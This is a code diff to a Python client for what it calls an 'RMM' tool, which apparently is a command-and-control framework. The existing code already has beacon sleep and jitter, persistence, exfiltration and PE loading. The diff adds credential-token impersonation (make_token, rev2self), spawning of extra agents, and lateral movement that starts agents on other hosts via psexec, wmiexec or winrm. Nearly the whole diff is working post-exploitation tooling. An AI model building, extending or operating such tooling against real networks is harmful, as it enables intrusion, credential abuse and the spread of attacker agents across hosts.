@@ -72,6 +72,11 @@ RMM_CLI_COMMANDS = [
     "tun",
     "events",
     "exec",
+    "spawn",
+    "make_token",
+    "rev2self",
+    "lateral",
+    "uid",
     "persist",
     "stop",
     "run",
@@ -180,6 +185,76 @@ class RmmApiClient:
             "POST",
             f"/api/v1/sessions/{session_id}/exec",
             {"command": command, "timeout": timeout},
+            timeout=timeout + 5,
+        )
+
+    def spawn_session(
+        self,
+        session_id: str,
+        verify: bool = True,
+        spawn_timeout: float = 120,
+        register_timeout: float = 60,
+        verify_timeout: float = 120,
+    ):
+        return self.request(
+            "POST",
+            f"/api/v1/sessions/{session_id}/spawn",
+            {
+                "verify": verify,
+                "spawn_timeout": spawn_timeout,
+                "register_timeout": register_timeout,
+                "verify_timeout": verify_timeout,
+            },
+            # Worst case: spawn wait + registration wait + two verification waits.
+            timeout=spawn_timeout + register_timeout + 2 * verify_timeout + 30,
+        )
+
+    def make_token(self, session_id: str, domain: str, user: str, password: str, timeout: float = 120):
+        return self.request(
+            "POST",
+            f"/api/v1/sessions/{session_id}/make_token",
+            {"domain": domain, "user": user, "password": password, "timeout": timeout},
+            timeout=timeout + 5,
+        )
+
+    def rev2self(self, session_id: str, timeout: float = 120):
+        return self.request(
+            "POST",
+            f"/api/v1/sessions/{session_id}/rev2self",
+            {"timeout": timeout},
+            timeout=timeout + 5,
+        )
+
+    def lateral_move(
+        self,
+        session_id: str,
+        method: str,
+        host: str,
+        verify: bool = True,
+        exec_timeout: float = 300,
+        register_timeout: float = 60,
+        verify_timeout: float = 120,
+    ):
+        return self.request(
+            "POST",
+            f"/api/v1/sessions/{session_id}/lateral",
+            {
+                "method": method,
+                "host": host,
+                "verify": verify,
+                "exec_timeout": exec_timeout,
+                "register_timeout": register_timeout,
+                "verify_timeout": verify_timeout,
+            },
+            # Worst case: lateral execution wait + registration + two verifications.
+            timeout=exec_timeout + register_timeout + 2 * verify_timeout + 30,
+        )
+
+    def session_uid(self, session_id: str, timeout: float = 120):
+        return self.request(
+            "POST",
+            f"/api/v1/sessions/{session_id}/uid",
+            {"timeout": timeout},
             timeout=timeout + 5,
         )
 
@@ -488,7 +563,7 @@ class RmmApiClient:
         """Read persisted status and final output without starting another job."""
         return self.request("GET", "/api/v1/ai/jobs/" + urllib.parse.quote(job_id, safe=""))
 
-    def deploy_agent_script(self, session_id="", sleep_seconds=60, jitter_percent=30, http_proxy=""):
+    def deploy_agent_script(self, session_id="", sleep_seconds=60, jitter_percent=30, http_proxy="", workspace_id=""):
         """Render a configured client_rmm.ps1 server-side; the secret never leaves the server."""
         return self.request(
             "POST",
@@ -498,6 +573,7 @@ class RmmApiClient:
                 "sleep_seconds": sleep_seconds,
                 "jitter_percent": jitter_percent,
                 "http_proxy": http_proxy,
+                "workspace_id": workspace_id,
             },
             timeout=60,
         )
@@ -852,6 +928,140 @@ def cmd_exec(client: RmmApiClient, state: dict, args):
     print(body)
 
 
+def cmd_spawn(client: RmmApiClient, state: dict, args):
+    sid = require_session(state, args.session)
+    say(f"Spawning detached Go agent from {sid[:8]} (waits for the next beacon)...", err=True)
+    code, data = client.spawn_session(
+        sid,
+        verify=not args.no_verify,
+        spawn_timeout=args.spawn_timeout,
+        register_timeout=args.register_timeout,
+        verify_timeout=args.verify_timeout,
+    )
+    if args.json:
+        print_json(data)
+        if code != 200 or (not data.get("ok") and not data.get("pending")):
+            raise SystemExit(1)
+        return
+    if code != 200:
+        detail = data.get("error") if isinstance(data, dict) else data
+        die(f"spawn failed ({code})" + (f": {detail}" if detail else ""), 1)
+    if not data.get("ok") and not data.get("pending"):
+        print_json(data)
+        die("Spawn unconfirmed: the expected agent has not registered. Inspect existing evidence before retrying.", 1)
+    say(f"Requested session {data['spawned_session_id']} (pid {data.get('spawn_pid') or 'unconfirmed'})")
+    if not data.get("verify"):
+        say("Registration was not checked (--no-verify); this request remains unconfirmed.")
+        return
+    say(f"registered: {'yes' if data.get('registered') else 'no'}")
+    say(f"parent responsive: {'yes' if data.get('parent_responsive') else 'no'}")
+    say(f"spawned responsive: {'yes' if data.get('spawned_responsive') else 'no'}")
+    if not data.get("verified"):
+        warn("Spawn verification did not pass — inspect both sessions before relying on them.")
+
+
+def split_identity(raw: str) -> tuple[str, str]:
+    """Split a DOMAIN\\user identity into its parts (user only stays as-is)."""
+    raw = (raw or "").strip()
+    if "\\" in raw:
+        domain, _, user = raw.partition("\\")
+        return domain.strip(), user.strip()
+    return "", raw
+
+
+def parse_identity_arguments(line: str) -> list[str]:
+    """Parse quoted identity arguments while preserving literal backslashes."""
+    lexer = shlex.shlex(line, posix=True)
+    lexer.whitespace_split = True
+    lexer.commenters = ""
+    lexer.escape = ""
+    return list(lexer)
+
+
+def cmd_make_token(client: RmmApiClient, state: dict, args):
+    sid = require_session(state, args.session)
+    domain, user = split_identity(args.user)
+    if not user:
+        die("Missing user in identity (use DOMAIN\\user or user)")
+    identity = f"{domain}\\{user}" if domain else user
+    say(f"Creating network token for {identity} (waits for the next beacon)...", err=True)
+    code, data = client.make_token(sid, domain, user, args.password, timeout=args.timeout)
+    if args.json:
+        print_json(data)
+        return
+    if code != 200:
+        detail = data.get("error") if isinstance(data, dict) else data
+        die(f"make_token failed ({code})" + (f": {detail}" if detail else ""), 1)
+    if not data.get("ok"):
+        die(f"make_token failed: {data.get('output')}", 1)
+    say(data.get("output") or f"token created: {identity}")
+
+
+def cmd_rev2self(client: RmmApiClient, state: dict, args):
+    sid = require_session(state, args.session)
+    say(f"Reverting {sid[:8]} to the agent identity (waits for the next beacon)...", err=True)
+    code, data = client.rev2self(sid, timeout=args.timeout)
+    if args.json:
+        print_json(data)
+        return
+    if code != 200:
+        detail = data.get("error") if isinstance(data, dict) else data
+        die(f"rev2self failed ({code})" + (f": {detail}" if detail else ""), 1)
+    if not data.get("ok"):
+        die(f"rev2self failed: {data.get('output')}", 1)
+    say(data.get("output") or "token reverted")
+
+
+def cmd_lateral(client: RmmApiClient, state: dict, args):
+    sid = require_session(state, args.session)
+    say(f"Lateral {args.method} to {args.host} (waits for the next beacon)...", err=True)
+    code, data = client.lateral_move(
+        sid,
+        args.method,
+        args.host,
+        verify=not args.no_verify,
+        exec_timeout=args.exec_timeout,
+        register_timeout=args.register_timeout,
+        verify_timeout=args.verify_timeout,
+    )
+    if args.json:
+        print_json(data)
+        if code != 200 or (not data.get("ok") and not data.get("pending")):
+            raise SystemExit(1)
+        return
+    if code != 200:
+        detail = data.get("error") if isinstance(data, dict) else data
+        die(f"lateral failed ({code})" + (f": {detail}" if detail else ""), 1)
+    if not data.get("ok"):
+        print_json(data)
+        if data.get("pending"):
+            say("Deployment requested; registration was not checked. This is not confirmed success.")
+            return
+        die("Deployment unconfirmed: the expected agent has not registered. Inspect existing evidence before retrying.", 1)
+    say(data.get("output") or f"lateral {args.method} started on {args.host}")
+    if not data.get("verify"):
+        say("Registration was not checked (--no-verify); this request remains unconfirmed.")
+        return
+    say(f"registered: {'yes' if data.get('registered') else 'no'}")
+    say(f"source responsive: {'yes' if data.get('source_responsive') else 'no'}")
+    say(f"target responsive: {'yes' if data.get('target_responsive') else 'no'}")
+    if not data.get("verified"):
+        warn("Lateral verification did not pass — inspect both sessions before relying on them.")
+
+
+def cmd_uid(client: RmmApiClient, state: dict, args):
+    sid = require_session(state, args.session)
+    say(f"Querying identity of {sid[:8]} (waits for the next beacon)...", err=True)
+    code, data = client.session_uid(sid, timeout=args.timeout)
+    if args.json:
+        print_json(data)
+        return
+    if code != 200:
+        detail = data.get("error") if isinstance(data, dict) else data
+        die(f"uid failed ({code})" + (f": {detail}" if detail else ""), 1)
+    print(data.get("output") or "")
+
+
 def cmd_config_set_sleep(client: RmmApiClient, state: dict, args):
     sid = require_session(state, args.session)
     code, data = client.patch_config(sid, sleep_seconds=args.seconds)
@@ -1082,11 +1292,13 @@ def cmd_agent(client: RmmApiClient, state: dict, args):
             sleep_seconds=int(getattr(args, "sleep", 60)),
             jitter_percent=int(getattr(args, "jitter", 30)),
             http_proxy=getattr(args, "proxy", "") or "",
+            **({"workspace_id": args.workspace_id} if getattr(args, "workspace_id", None) else {}),
         )
     elif action == "go-build":
         code, data = client.build_go_agent(
             goos=getattr(args, "goos", "windows"),
             goarch=getattr(args, "goarch", "amd64"),
+            **({"config": {"workspace_id": args.workspace_id}} if getattr(args, "workspace_id", None) else {}),
             use_server_config=not getattr(args, "no_server_config", False),
         )
     else:
@@ -1254,6 +1466,9 @@ def _show_help():
 Session:  /list | /use <id> | /info | /background | /kill [id]
 Beacon:   /set_sleep <seconds> | /set_jitter <percent> | /show_config
 Remote:   <command> or /run <command>  (queue) | /exec <command>  (wait) | /persist <cmd> | /stop
+Spawn:    /spawn [id]   (detached second Go agent, fresh session ID, verifies both sessions)
+Identity: /make_token <domain\\user | user> <password>  (runas /netonly style) | /rev2self | /uid
+Lateral:  /lateral <psexec|wmiexec|winrm> <host>   (start a Go agent on another host)
 Files:    /download <remote> | /exfil <remote> [profile] | /upload <local> <remote> | /screenshot
 Plugins: /pe list | /pe <plugin> [export] [input]   (isolated PE load; marked DLLs use a temporary file)
 Config:   /rclone-config   (rclone profiles + bootstrap status)
@@ -1303,13 +1518,17 @@ class RmmCliCompleter:
 
         cmd = parts[0][1:].lower() if parts[0].startswith("/") else ""
 
-        if cmd in ("use", "kill") and (
+        if cmd in ("use", "kill", "spawn") and (
             len(parts) == 1 or (len(parts) == 2 and not line.endswith(" "))
         ):
             matches = [p for p in self._session_prefixes() if p.startswith(text)]
             if state_index < len(matches):
                 return matches[state_index] + (" " if cmd == "use" else "")
             return None
+
+        if cmd == "lateral" and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(" "))):
+            matches = [m for m in ("psexec", "wmiexec", "winrm") if m.startswith(text.lower())]
+            return matches[state_index] + " " if state_index < len(matches) else None
 
         if cmd == "upload" and len(parts) == 2 and not line.endswith(" "):
             matches = glob.glob(text + "*")
@@ -1346,7 +1565,7 @@ class RmmCliPTKCompleter(_PTCompleterBase):
 
         cmd = parts[0][1:].lower()
 
-        if cmd in ("use", "kill"):
+        if cmd in ("use", "kill", "spawn"):
             if len(parts) == 1 and line.endswith(" "):
                 for p in self._words._session_prefixes():
                     yield Completion(p + " ", start_position=0)
@@ -1357,6 +1576,13 @@ class RmmCliPTKCompleter(_PTCompleterBase):
                     if p.startswith(prefix):
                         yield Completion(p + (" " if cmd == "use" else ""), start_position=-len(prefix))
                 return
+
+        if cmd == "lateral" and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(" "))):
+            prefix = parts[1] if len(parts) == 2 else ""
+            for method in ("psexec", "wmiexec", "winrm"):
+                if method.startswith(prefix.lower()):
+                    yield Completion(method + " ", start_position=-len(prefix))
+            return
 
         if cmd == "upload" and len(parts) == 2 and not line.endswith(" "):
             prefix = parts[1]
@@ -1729,6 +1955,116 @@ def run_interactive(
                     say("Screenshot queued")
                 else:
                     warn(f"failed ({code})")
+                continue
+            if cmd == "spawn":
+                sid_arg = rest[0] if rest else None
+                sid = session_or_none(state, sid_arg)
+                if not sid and sid_arg:
+                    sid = _resolve_session_id(client, state, sid_arg)
+                if not sid:
+                    warn("No session to spawn from. Use: /spawn [session_id]")
+                    continue
+                say("Spawning detached Go agent (waits for the next beacon)...")
+                code, data = client.spawn_session(sid)
+                if code != 200:
+                    detail = data.get("error") if isinstance(data, dict) else data
+                    warn(f"spawn failed ({code})" + (f": {detail}" if detail else ""))
+                    continue
+                say(f"Requested session {data.get('spawned_session_id')} (pid {data.get('spawn_pid') or 'unconfirmed'})")
+                if data.get("verify"):
+                    say(
+                        f"registered: {'yes' if data.get('registered') else 'no'}; "
+                        f"parent responsive: {'yes' if data.get('parent_responsive') else 'no'}; "
+                        f"spawned responsive: {'yes' if data.get('spawned_responsive') else 'no'}"
+                    )
+                    if not data.get("verified"):
+                        warn("Spawn verification did not pass — inspect both sessions.")
+                _refresh_completion_sessions(client, state)
+                continue
+            if cmd == "make_token":
+                try:
+                    rest = parse_identity_arguments(line)[1:]
+                except ValueError:
+                    warn("Invalid quoting. Use /make_token <identity> <password>; quote passwords containing spaces.")
+                    continue
+                if len(rest) != 2:
+                    warn("Usage: /make_token <domain\\user | user> <password>")
+                    continue
+                sid = session_or_none(state)
+                if not sid:
+                    warn("No session selected")
+                    continue
+                domain, user = split_identity(rest[0])
+                if not user:
+                    warn("Missing user in identity (use DOMAIN\\user or user)")
+                    continue
+                identity = f"{domain}\\{user}" if domain else user
+                say(f"Creating network token for {identity} (waits for the next beacon)...")
+                code, data = client.make_token(sid, domain, user, rest[1])
+                if code != 200:
+                    detail = data.get("error") if isinstance(data, dict) else data
+                    warn(f"make_token failed ({code})" + (f": {detail}" if detail else ""))
+                elif not data.get("ok"):
+                    warn(f"make_token failed: {data.get('output')}")
+                else:
+                    say(data.get("output") or f"token created: {identity}")
+                continue
+            if cmd == "rev2self":
+                sid = session_or_none(state)
+                if not sid:
+                    warn("No session selected")
+                    continue
+                say("Reverting to the agent identity (waits for the next beacon)...")
+                code, data = client.rev2self(sid)
+                if code != 200:
+                    detail = data.get("error") if isinstance(data, dict) else data
+                    warn(f"rev2self failed ({code})" + (f": {detail}" if detail else ""))
+                elif not data.get("ok"):
+                    warn(f"rev2self failed: {data.get('output')}")
+                else:
+                    say(data.get("output") or "token reverted")
+                continue
+            if cmd == "lateral":
+                if len(rest) != 2:
+                    warn("Usage: /lateral <psexec|wmiexec|winrm> <host>")
+                    continue
+                sid = session_or_none(state)
+                if not sid:
+                    warn("No session selected")
+                    continue
+                method, host = rest[0].lower(), rest[1]
+                say(f"Lateral {method} to {host} (waits for the next beacon)...")
+                code, data = client.lateral_move(sid, method, host)
+                if code != 200:
+                    detail = data.get("error") if isinstance(data, dict) else data
+                    warn(f"lateral failed ({code})" + (f": {detail}" if detail else ""))
+                elif not data.get("ok"):
+                    warn(f"lateral failed: {data.get('output')}")
+                else:
+                    say(data.get("output") or f"lateral {method} started on {host}")
+                    if data.get("verify"):
+                        say(
+                            f"registered: {'yes' if data.get('registered') else 'no'}; "
+                            f"source responsive: {'yes' if data.get('source_responsive') else 'no'}; "
+                            f"target responsive: {'yes' if data.get('target_responsive') else 'no'}"
+                        )
+                        if not data.get("verified"):
+                            warn("Lateral verification did not pass — inspect both sessions.")
+                    _refresh_completion_sessions(client, state)
+                continue
+            if cmd == "uid":
+                sid = session_or_none(state)
+                if not sid:
+                    warn("No session selected")
+                    continue
+                say("Querying agent identity (waits for the next beacon)...")
+                code, data = client.session_uid(sid)
+                if code != 200:
+                    detail = data.get("error") if isinstance(data, dict) else data
+                    warn(f"uid failed ({code})" + (f": {detail}" if detail else ""))
+                else:
+                    for line in (data.get("output") or "").splitlines() or ["(no output)"]:
+                        say(line)
                 continue
             if cmd == "pe":
                 if rest and rest[0].lower() == "list":
@@ -2164,6 +2500,57 @@ def build_parser() -> argparse.ArgumentParser:
     sp_exec.add_argument("--wait", type=float, default=120, help="Timeout seconds")
     sp_exec.set_defaults(func=cmd_exec)
 
+    sp_spawn = sub.add_parser(
+        "spawn",
+        parents=[shared],
+        help="Spawn a detached second Go agent from a live Go session and verify both sessions",
+    )
+    sp_spawn.add_argument("--session", "-s", default=None)
+    sp_spawn.add_argument("--no-verify", action="store_true", help="Skip checks and report an unconfirmed request, not deployment success")
+    sp_spawn.add_argument("--spawn-timeout", type=float, default=120, help="Seconds to wait for the spawn command result")
+    sp_spawn.add_argument("--register-timeout", type=float, default=60, help="Seconds to wait for the spawned session to register")
+    sp_spawn.add_argument("--verify-timeout", type=float, default=120, help="Seconds to wait for each verification command")
+    sp_spawn.set_defaults(func=cmd_spawn)
+
+    sp_mt = sub.add_parser(
+        "make-token",
+        parents=[shared],
+        help="Create a runas /netonly style network identity on a Go agent session",
+    )
+    sp_mt.add_argument("user", help="Identity as DOMAIN\\user or plain user")
+    sp_mt.add_argument("password", help="Password for the network identity")
+    sp_mt.add_argument("--session", "-s", default=None)
+    sp_mt.add_argument("--timeout", type=float, default=120, help="Seconds to wait for the agent result")
+    sp_mt.set_defaults(func=cmd_make_token)
+
+    sp_rev = sub.add_parser(
+        "rev2self",
+        parents=[shared],
+        help="Revert a Go agent session to its own network identity",
+    )
+    sp_rev.add_argument("--session", "-s", default=None)
+    sp_rev.add_argument("--timeout", type=float, default=120, help="Seconds to wait for the agent result")
+    sp_rev.set_defaults(func=cmd_rev2self)
+
+    sp_lat = sub.add_parser(
+        "lateral",
+        parents=[shared],
+        help="Start a Go agent on another host through psexec, wmiexec, or winrm",
+    )
+    sp_lat.add_argument("method", choices=["psexec", "wmiexec", "winrm"])
+    sp_lat.add_argument("host", help="Target hostname or IP address")
+    sp_lat.add_argument("--session", "-s", default=None)
+    sp_lat.add_argument("--no-verify", action="store_true", help="Skip checks and report an unconfirmed request, not deployment success")
+    sp_lat.add_argument("--exec-timeout", type=float, default=300, help="Seconds to wait for the lateral execution result")
+    sp_lat.add_argument("--register-timeout", type=float, default=60, help="Seconds to wait for the target session to register")
+    sp_lat.add_argument("--verify-timeout", type=float, default=120, help="Seconds to wait for each verification command")
+    sp_lat.set_defaults(func=cmd_lateral)
+
+    sp_uid = sub.add_parser("uid", parents=[shared], help="Show the identity used by a Go agent session")
+    sp_uid.add_argument("--session", "-s", default=None)
+    sp_uid.add_argument("--timeout", type=float, default=120, help="Seconds to wait for the agent result")
+    sp_uid.set_defaults(func=cmd_uid)
+
     sp_cfg = sub.add_parser("config", help="Beacon configuration")
     sp_cfg_sub = sp_cfg.add_subparsers(dest="config_cmd", required=True)
     sp_sleep = sp_cfg_sub.add_parser("set-sleep", help="Set sleep interval (1-3600)")
@@ -2277,11 +2664,13 @@ def build_parser() -> argparse.ArgumentParser:
     sp_agent_deploy.add_argument("--sleep", type=int, default=60, help="Beacon sleep in seconds (default 60)")
     sp_agent_deploy.add_argument("--jitter", type=int, default=30, help="Beacon jitter percent (default 30)")
     sp_agent_deploy.add_argument("--proxy", help="Optional HTTP proxy URL used by the deployed agent")
+    sp_agent_deploy.add_argument("--workspace-id", help="Administrator-selected owner; workspace authentication binds this automatically")
     sp_agent_deploy.set_defaults(func=cmd_agent)
     sp_agent_go = sp_agent_sub.add_parser("go-build", parents=[shared], help="Build the Go agent with the active server connection")
-    sp_agent_go.add_argument("--goos", default="windows", choices=["windows", "linux", "darwin"])
+    sp_agent_go.add_argument("--goos", default="windows", choices=["windows"])
     sp_agent_go.add_argument("--goarch", default="amd64", choices=["amd64", "arm64"])
     sp_agent_go.add_argument("--no-server-config", action="store_true", help="Build a generic agent without embedded connection settings")
+    sp_agent_go.add_argument("--workspace-id", help="Administrator-selected owner; workspace authentication binds this automatically")
     sp_agent_go.set_defaults(func=cmd_agent)
 
     sp_profile = sub.add_parser("profile", help="Manage the dynamic RMM-Profile connector")
